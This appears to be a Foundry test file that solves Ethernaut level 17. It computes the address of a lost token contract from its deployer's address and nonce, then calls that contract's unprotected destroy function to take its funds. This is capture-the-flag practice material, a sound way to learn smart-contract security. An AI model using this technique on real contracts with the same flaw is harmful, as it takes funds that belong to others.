pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract Ethernaut17 is EthernautTest {
    constructor() EthernautTest(17) {}

    function solve() internal override(EthernautTest) {
        bytes memory data = abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            instance,
            bytes1(0x01)
        );

        address contractAddress = address(uint160(uint256(keccak256(data))));

        ISimpleToken(contractAddress).destroy(payable(address(this)));
    }
}
